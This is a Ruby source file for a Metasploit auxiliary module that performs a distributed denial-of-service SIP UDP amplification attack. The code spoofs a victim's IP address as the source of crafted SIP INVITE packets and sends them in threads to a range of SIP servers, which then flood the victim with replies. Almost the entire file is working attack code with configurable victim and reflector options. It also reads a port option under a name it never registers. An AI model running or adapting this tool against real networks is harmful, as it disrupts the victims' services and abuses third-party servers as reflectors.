##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Capture
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Viproy DDOS SIP Amplification Attack',
      'Version'     => '1',
      'Description' => 'DDOS SIP UDP amplification attack module',
      'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
      'License'     => MSF_LICENSE
    )

    begin
      require 'pcaprub'
      @@havepcap = true
    rescue ::LoadError
      @@havepcap = false
    end

    deregister_options('FILTER','PCAPFILE','RPORT', 'RHOSTS', 'RPORTS', 'RHOST' )
    register_options(
    [
      OptInt.new('PACKET_COUNT', [true, 'The count of the packets', 100]),
      OptInt.new('VICTIM_PORT', [true, 'Target UDP Port of Victim', 5060]),
      OptAddress.new('VICTIM_IP', [true, 'Target IP of Victim']),
      OptAddressRange.new('SIP_SERVERS', [true, 'Vulnerable SIP Servers']),
      OptInt.new('SIP_PORT',   [true, 'Target Port of The SIP Server',5060]),
      OptString.new('TO',   [ true, "Destination Number at Target SIP Server", "100"]),
      OptString.new('FROM',   [ true, "Source Number for Target SIP Server", "100"]),
    ], self.class)

    register_advanced_options(
    [
      OptString.new('CUSTOMHEADER', [false, 'Custom Headers for Requests', nil]),
      OptString.new('P-Charging-Vector', [false, 'Proxy Charging Field. Sample: icid-value=msanicid;msan-id=msan123;msan-pro=1 ', nil]),
      OptString.new('Record-Route', [false, 'Proxy Record-Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
      OptString.new('Route', [false, 'Proxy Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
    ], self.class)
  end

  def run
    sockinfo={}
    sip_hosts = Rex::Socket::RangeWalker.new(datastore['SIP_SERVERS'])
    sockinfo["sip_port"] = datastore['SIP_RPORT']
    sockinfo["victim_ip"] = datastore['VICTIM_IP']
    sockinfo["victim_port"] = datastore['VICTIM_PORT']
    sockinfo["to"] = datastore['TO']
    sockinfo["from"] = datastore['FROM']

    begin
    #Building Custom Headers
    customheader = ""
    customheader << datastore['CUSTOMHEADER']+"\r\n" if datastore['CUSTOMHEADER'] != nil
    customheader << "P-Charging-Vector: "+datastore['P-Charging-Vector']+"\r\n" if datastore['P-Charging-Vector'] != nil
    customheader << "Record-Route: "+datastore['Record-Route']+"\r\n" if datastore['Record-Route'] != nil
    customheader << "Route: "+datastore['Route']+"\r\n" if datastore['Route'] != nil
    sockinfo["customheader"] = customheader

    print_status("This modules works only under Linux!")
    print_status("Starting SIP UDP amplification attack for #{datastore['VICTIM_IP']}")

    # Sending spoofed packages
    a = []
    sip_hosts.each do |s_host|
      a << framework.threads.spawn("Module(#{self.refname})", false, s_host) do |sip_host|
        print_status "Sending Spoofed Packets to : #{sip_host}"
        sockinfo["sip_host"]=sip_host
        datastore["PACKET_COUNT"].times do
          send_request(sockinfo)
        end
      end
    end
    a.map {|x| x.join }
    print_good("SIP UDP amplification sweep is completed")

    rescue Rex::TimeoutError, Rex::Post::Meterpreter::RequestError
    rescue ::Exception => e
      print_status("The following Error was encountered: #{e.class} #{e}")
    ensure
      a.map {|x| x.kill }
    end
  end

  def send_request(sockinfo)
    #Assembling Packet
    open_pcap
    p = PacketFu::UDPPacket.new
    p.ip_saddr = sockinfo["victim_ip"]
    p.ip_daddr = sockinfo["sip_host"]
    p.ip_ttl = 255
    p.udp_sport = sockinfo["victim_port"]
    p.udp_dport = sockinfo["sip_port"]
    p.payload=prep_invite(sockinfo)
    p.recalc

    #Sending Packet
    ret = send(p.ip_daddr,p)
    if ret == :done
      vprint_status("#{p.ip_saddr}: Sent a packet to #{p.ip_daddr} from #{p.udp_sport}")
    else
      print_error("#{p.ip_saddr}: Packet not sent for port #{p.udp_sport} ")
    end
    close_pcap
  end

  def prep_invite(sockinfo)
    #Setting Variables
    src_addr = sockinfo["victim_ip"]
    src_port = sockinfo["victim_port"]
    ip = sockinfo["sip_host"]
    port = sockinfo["sip_port"]
    to = sockinfo["to"]
    from = sockinfo["from"]
    cheader = sockinfo["customheader"]

    #Preparing Request
    data =  "INVITE sip:#{to}@#{ip} SIP/2.0\r\n"
    data += "Via: SIP/2.0/UDP #{src_addr}:#{src_port};branch=branch#{Rex::Text.rand_text_alphanumeric(10)};rport\r\n"
    data += "Max-Forwards: 70\r\n"
    data += "From: <sip:#{from}@#{src_addr}>;tag=tag#{Rex::Text.rand_text_alphanumeric(10)}\r\n"
    data += "To: <sip:#{to}@#{ip}>\r\n"
    if datastore['FROM'] =~ /FUZZ/
      data += "Contact: <sip:123@#{src_addr}>\r\n"
    elsif datastore['CONTACT'] =~ /FUZZ/
      data += "Contact: <sip:#{"A"*datastore['CONTACT'].split(" ")[1].to_i}@#{src_addr}>\r\n"
    else
      data += "Contact: <sip:#{from}@#{src_addr}>\r\n"
    end
    data += "Call-ID: call#{Rex::Text.rand_text_alphanumeric(10)}@#{src_addr}\r\n"
    data += "CSeq: 1 INVITE\r\n"
    data += "User-Agent: Test Agent\r\n"
    data += "Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO\r\n"
    data += "Supported: replaces, timer\r\n"
    data += cheader
    data += "Content-Type: application/sdp\r\n"

    idata = "v=0\r\n"
    idata += "o=root 1716603896 1716603896 IN IP4 #{src_addr}\r\n"
    idata += "s=Test Source\r\n"
    idata += "c=IN IP4 #{src_addr}\r\n"
    idata += "t=0 0\r\n"
    idata += "m=audio 10024 RTP/AVP 0 101\r\n"
    idata += "a=rtpmap:0 PCMU/8000\r\n"
    idata += "a=rtpmap:101 telephone-event/8000\r\n"
    idata += "a=fmtp:101 0-16\r\n"
    idata += "a=ptime:20\r\n"
    idata += "a=sendrec\r\n"

    data += "Content-Length: #{idata.length}\r\n\r\n#{idata}"

    return data
  end

  def send(ip,pkt)
    begin
      capture_sendto(pkt, ip)
    rescue RuntimeError => e
      return :error
    end
    return :done
  end
end
